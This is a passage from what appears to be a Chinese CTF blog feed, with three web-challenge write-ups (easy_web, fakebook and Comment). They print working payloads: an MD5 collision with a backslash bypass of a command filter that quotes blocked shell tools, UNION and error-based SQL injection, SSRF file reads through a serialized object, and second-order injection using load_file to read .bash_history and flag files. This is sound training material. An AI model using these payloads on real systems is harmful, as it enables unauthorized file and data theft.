        <content type="html"><![CDATA[<p>题目打开用burp抓包。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422214115745.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422214115745.png" class="lazyload"></a><p>发现这里可以通过base64 进行解码。两次base64解码后得到一串数字，再转字符串。</p><p>得到图片名字：555.png。</p><p>将<strong>index.php</strong>进行相同编码试一试。</p><p>编码后结果是：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 替换img值。</p><p>得到新的base64编码后的图片。但并不是图片，进行base64解码后得到网页源码。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422215238788.png" data-fancybox="group" data-caption="image-20200422215238788" class="fancybox"><img alt="image-20200422215238788" style="zoom: 67%;" title="image-20200422215238788" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422215238788.png" class="lazyload"></a><p>这里进行了MD5的强碰撞，要求传入两个不同的字符串且MD5的值和类型要相同，必须传入字符串所以不可以用数组绕过。若满足条件就执行输出cmd的内容。</p><p>echo`$cmd` 会先将反引号内的命令执行一遍再将执行结果作为echo输出的内容输出。与echo (cmd)相同。</p><p>但是cmd的一些命令被过滤。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ls被过滤可以使用dir读取。开始构造payload。</p><p>关于MD5 弱比较和强碰撞。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) </span><br><span class="line">MD5碰撞 必须输入字符类型不能用数组绕过</span><br><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">弱比较</span><br><span class="line">if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D; md5($_POST[&#39;b&#39;])) </span><br><span class="line">0e开头MD5会被认为使相同的</span><br><span class="line">a&#x3D;QNKCDZO&amp;b&#x3D;aabg7XSs</span><br><span class="line">if ($_POST[&#39;a&#39;] !&#x3D;&#x3D; $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) </span><br><span class="line">强比较，需要比较MD5传入数组</span><br><span class="line">传入MD5数组值时0会被解析为假，不为0的数值都会被解析为真。所以a[]&#x3D;1与b[]&#x3D;2是相等的</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure></div><p>payload：</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221215428.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221215428.png" class="lazyload"></a><p>列出所有文件名</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221255391.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221255391.png" class="lazyload"></a><p>没有flag，回到根目录读取，过滤了空格可以用%20代替。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221820223.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_web/image-20200422221820223.png" class="lazyload"></a><p>看到flag在bin目录下，开始读取flag。</p><p>查看文件内容的一些常规命令都被禁止了。但除了这些以外还可以使用<code>sort</code></p><p><strong>关于本题的反斜杠逃逸</strong></p><p>本题在写正则表达式时<code>|\\|\\\\|</code> 并没有过滤掉反斜杠，造成了反斜杠的逃逸。</p><p><code>|\\|\\\\|</code>  先经过php解释器解析后变成了 <code>|\|\\|</code>。再由正则表达式的解析器进行解析。</p><p>因为|是正则中的保留符号所以需要一个反斜杠符来进行转义，所以在正则表达式的解析器解析到第一个<code>\|</code>的时侯它就被转义为了<code>\</code>此时表达式变成了<code>||\\|</code> 然后再继续进行解析，<code>\\</code>解析为<code>\</code> 此时为<code>||\|</code> , \又将后面的|进行转义，最终变为<code>|||</code> 造成了反斜杠逃逸。可以使用ca\t或c\at。来进行读取文件。</p><p>构造payload： cmd=/bin/ca\t%20/flag  </p><p>读取到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xctf fakebook</title>
      <link href="/2020/04/27/fakebook/"/>
      <url>/2020/04/27/fakebook/</url>
      
        <content type="html"><![CDATA[<p>打开后在view.php页面发现存在注入点，输入不存在的值报错。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423164022964.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423164022964.png" class="lazyload"></a><p>判断列数</p><p>?no=1 order by 5    //有四列。</p><p>?no=-1 union/**/select 6,7,8,9     //第二列会回显</p><p>?no=-1 union/**/select 6,database(),8,9    //暴库</p><p>暴表，提示错误。改用报错注入concat被禁止了改为make_set。</p><p>?no=-1 and extractvalue(1,make_set(3,’~’,(select group_concat(table_name) from information_schema.tables where table_schema=database())))          //暴表</p><p>?no=-1 and extractvalue(1,make_set(3,’~’,(select group_concat(column_name) from information_schema.columns where table_name=’users’)))  //暴字段</p><p>?no=-1 and extractvalue(1,make_set(3,’~’,(select data from users)))  //暴信息</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423172156116.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423172156116.png" class="lazyload"></a><p>data中有被序列化的内容。</p><p>扫描网站目录发现有robots.txt。访问后根据提供目录下载到源码。</p><p>看wp，有存在SSRF(服务端请求伪造)漏洞。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423172913814.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423172913814.png" class="lazyload"></a><p>了解通过SSRF可以达到文件读取的目的。在报错信息中我们知道了当前页面所处的路径为/var/www/html/。</p><p>data中储存着序列化的信息所以我们提供的payload应该是序列化后的格式。服务端请求伪造漏洞可以让我们访问到服务器上的文件。为了达到文件协议达到文件读取的目的我们需要在序列化时构造file文件协议。</p><p>将需要读取的文件协议根据源码格式进行序列化。</p><a href="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423201338755.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:67%;" data-src="http://t0ki.oss-cn-beijing.aliyuncs.com/xctf%20fakebook/image-20200423201338755.png" class="lazyload"></a><p>反序列化读取flag。</p><p>payload：</p><p><code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p><p>读取到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018[网鼎杯]Comment</title>
      <link href="/2020/04/21/2018-Comment/"/>
      <url>/2020/04/21/2018-Comment/</url>
      
        <content type="html"><![CDATA[<p>F12 发现存在/.git泄露</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419215153731.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419215153731.png" class="lazyload"></a><p>看wp知道因为没有commit文件所以泄露后的/.git 文件需要修复</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --relog     进入泄露后的文件夹查看更改历史</span><br></pre></td></tr></table></figure></div><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419222831341.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419222831341.png" class="lazyload"></a><p>复制（refs/stash）的commit再改变HEAD的位置</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br></pre></td></tr></table></figure></div><p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419223157595.png" data-fancybox="group" data-caption="image-20200419223157595" class="fancybox"><img alt="image-20200419223157595" title="image-20200419223157595" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200419223157595.png" class="lazyload"></a></p><p>再次查看文件得到完整代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);      &#x2F;&#x2F;通过addslashes函数转义存入category的值</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);      &#x2F;&#x2F;通过id值从数据库中取出write时存入的category值</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;                  &#x2F;&#x2F;此时从数据库中取出的category值没有被add函数转义时存在的反斜杠符</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];&#x2F;&#x2F;利用从数据库取值绕过了第一次的add转义</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>发现存在二次注入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">发帖</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">留言</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure></div><p>开始做题需要登录，根据提示用burp爆破得到密码后三位是数字666</p><p>用户名：<u>zhangwei</u></p><p>密码：<u>zhangwei666</u></p><p>开始利用二次注入读取需要的信息</p><p>addslashes函数会把’ “ %00 \ 这些字符前面加上一个\来转义他们。但留言sql语句中查询时的category值是根据id值从数据库中取出的。被addslashes函数转义后的值存入数据库后是不通过转义的（不带有\），所以取出时的category值也没有经过转义。即可利用这个点绕过addslashes函数转义，达到注入。</p><p><a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">关于addslashes函数的绕过总结</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line"><span class="comment">//多行注释符/**/</span></span><br><span class="line"><span class="comment">//单行注释符#</span></span><br></pre></td></tr></table></figure></div><p>注入</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150754087.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150754087.png" class="lazyload"></a><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150831678.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150831678.png" class="lazyload"></a><p>此时sql语句为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '',content=database(),/*',</span></span><br><span class="line"><span class="string">                content = '*/#',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure></div><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150852164.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420150852164.png" class="lazyload"></a><p>暴出数据库ctf</p><p>尝试了暴表，但不可以。看wp知道是要读取文件。</p><p>Load_file函数的功能是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。不满足上述任意一个条件则返回null。</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153031171.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:50%;" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153031171.png" class="lazyload"></a><p>看到/home/www下以bash身份运行。</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153333311.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom: 67%;" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153333311.png" class="lazyload"></a><p>.bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下。读取.bash_history文件。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;,content&#x3D;(select( load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure></div><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153851015.png" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" style="zoom:50%;" title="image" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420153851015.png" class="lazyload"></a><p>历史命令解析：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp                 进入&#x2F;tmp </span><br><span class="line">unzip html.zip          解压html到当前目录下</span><br><span class="line">rm -rf html.zip         删除压缩包</span><br><span class="line">cp -r html &#x2F;var&#x2F;www&#x2F;    从&#x2F;var&#x2F;www 目录下复制html文件夹到&#x2F;tmp目录下</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html        进入&#x2F;var&#x2F;www&#x2F;html </span><br><span class="line">rm -rf .DS_Store        删除此文件夹里的.DS_Store文件</span><br></pre></td></tr></table></figure></div><p>所以可以知道此时的.DS_Store文件在/tmp/html 目录下。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;,content&#x3D;(select hex( load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure></div><p>hex转字符后</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160458085.png" data-fancybox="group" data-caption="image-20200420160458085" class="fancybox"><img alt="image-20200420160458085" style="zoom:80%;" title="image-20200420160458085" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160458085.png" class="lazyload"></a><p>后面还有</p><a href="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160729757.png" data-fancybox="group" data-caption="image-20200420160729757" class="fancybox"><img alt="image-20200420160729757" style="zoom:80%;" title="image-20200420160729757" data-src="https://t0ki.oss-cn-beijing.aliyuncs.com/image-20200420160729757.png" class="lazyload"></a><p>flag与index.php在同一文件夹下。回到/var/www/html 目录下读取flag。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#39;, content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure></div><p>因为html是从/var/www/复制过来的，第一次在/tmp/下读到的不对。</p><p>读取成功。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
